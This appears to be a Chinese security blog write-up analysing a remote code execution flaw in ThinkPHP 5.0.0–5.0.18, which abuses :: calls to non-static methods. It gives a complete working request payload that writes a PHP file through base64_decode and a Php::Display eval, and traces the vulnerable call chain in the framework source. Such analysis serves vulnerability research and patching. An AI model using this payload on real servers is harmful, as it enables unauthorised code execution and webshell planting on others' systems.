# Thinkphp非静态方法调用RCE

**影响版本**

---

thinkphp5.0.0-5.0.18

### 写在前面

---

本篇文章参考y4师傅的博客

https://y4tacker.blog.csdn.net/article/details/115893304

## 前提

---

利用的重点在于在一定条件下可以使用::来调用非静态方法

首先我们需要了解静态属性和静态方法是如何调用的，静态属性一般使用self::进行调用，但是在该篇博客上面使用了::的骚操作，用::调用非静态方法

```
<?php
class People{
    static public $name = "pana";
    public $height = 170;

    static public function output(){
        //静态方法调用静态属性使用self
        print self::$name."<br>";
        //静态方法调用非静态属性（普通方法）需要先实例化对象
        $t = new People() ;
        print $t -> height."<br>";

    }

    public function say(){
        //普通方法调用静态属性使用self
        print self::$name."<br>";
        //普通方法调用普通属性使用$this
        print $this -> height."<br>";
    }
}
$pa = new People();
$pa -> output();
$pa -> say();
//可以使用::调用普通方法
$pan = People::say();
```



可以看到最后的输出，仍然输出了name的值，但是却没有输出height的值

![](https://s2.loli.net/2022/08/06/XdU1I3uDx6mTFLW.png)

原因在于：php里面使用双冒号调用方法或者属性时候有两种情况：

1. 直接使用::调用静态方法或者属性
2. ::调用普通方法时，需要该方法内部没有调用非静态的方法或者变量，也就是没有使用$this，这也就是为什么输出了name的值而没有输出height

了解上面这些，我们就可以开始下面的分析

## 分析

---

先放上流程图（本人比较菜鸡 所以只能用这种方法记录下来流程）

![](https://s2.loli.net/2022/08/06/JD31cvLahAoYCiS.png)

首先放上payload

```
path=PD9waHAgZmlsZV9wdXRfY29udGVudHMoJzIyMi5waHAnLCc8P3BocCBwaHBpbmZvKCk7Pz4nKTsgPz4=&_method=__construct&filter[]=set_error_handler&filter[]=self::path&filter[]=base64_decode&filter[]=\think\view\driver\Php::Display&method=GET
```

#### payload的分析

----

这里的base解码为<?php file_put_contents('222.php','<?php phpinfo();?>'); ?>，使用变量覆盖将_method的值设置为_construct，这里的set_error_handler是设置用户自定义的错误处理程序，能够绕过标准的php错误处理程序，接下来就是调用\think\view\driver\Php下面的Display方法，因为我们要利用里面的

```
eval('?>' . $content);
```

完成写shell的目的

![](https://s2.loli.net/2022/08/06/hNG2c5ykH6es9Co.jpg)

虽然会报错，但是不影响写入

![](https://s2.loli.net/2022/08/06/fSiaqDMymAFpEWK.png)

首先从App.php开始，在routeCheck方法处打断点

```
public static function routeCheck($request, array $config)
{
    $path   = $request->path();
    $depr   = $config['pathinfo_depr'];
    $result = false;
    // 路由检测
    $check = !is_null(self::$routeCheck) ? self::$routeCheck : $config['url_route_on'];
    if ($check) {
        // 开启路由
        if (is_file(RUNTIME_PATH . 'route.php')) {
            // 读取路由缓存
            $rules = include RUNTIME_PATH . 'route.php';
            if (is_array($rules)) {
                Route::rules($rules);
            }
        } else {
            $files = $config['route_config_file'];
            foreach ($files as $file) {
                if (is_file(CONF_PATH . $file . CONF_EXT)) {
                    // 导入路由配置
                    $rules = include CONF_PATH . $file . CONF_EXT;
                    if (is_array($rules)) {
                        Route::import($rules);
                    }
                }
            }
        }
```



这一步主要是获取$path的值，也就是我们要走的路由captcha

![](https://s2.loli.net/2022/08/06/uAswVc5G1l43TID.png)

继续往下走，$result = Route::check($request, $path, $depr, $config['url_domain_deploy']);，跟进check方法，这里面的重点就是获取method的值，$request->method()

![](https://s2.loli.net/2022/08/06/ZeN8iGqozrfpIb3.png)

这里是调用var_method，因为我们传入了_method=__construct，也就是变量覆盖

![](https://s2.loli.net/2022/08/06/lkvaVmRCW3Yo7Lt.png)

那下一步继续跟进__construct，走完construct函数后，可以看到大部分的值都是我们希望传进去的，这时method的值为GET，也就是为什么payload里面要传GET的原因

![](https://s2.loli.net/2022/08/06/bGsZEV8cerRWJaA.png)

下一步要获取当前请求类型的路由规则

```
$rules = self::$rules[$method];
```

可以看到这里的rule和route的值都发生了改变，路由值为\think\captcha\CaptchaController@index

![](https://s2.loli.net/2022/08/06/jIgP5U4E8ZTdiLV.png)

接下来跟进routeCheck()方法，走完这个方法后，返回result值

![](https://s2.loli.net/2022/08/06/ZdpSnOclJqrafFU.png)

接下来进入dispatch方法

![](https://s2.loli.net/2022/08/06/SwkRAUhrG5qFyQa.png)

![](https://s2.loli.net/2022/08/06/AOUKWMHRPSL4daj.png)

接下来进入param方法，合并请求参数和url地址栏的参数

```
$this->param = array_merge($this->get(false), $vars, $this->route(false));
```

![](https://s2.loli.net/2022/08/06/6xTl1HyvS9XE2LR.png)

然后进入get方法，继续跟进input方法

![](https://s2.loli.net/2022/08/06/c5HPFnirx2ETBtX.png)

![](https://s2.loli.net/2022/08/06/lSGL57UsjZzIbWn.png)

然后就会回到filterValue方法执行任意方法

![](https://s2.loli.net/2022/08/06/4cH2rzTie1Z9tEg.png)

![](https://s2.loli.net/2022/08/06/tcDqXB87z93sTiY.png)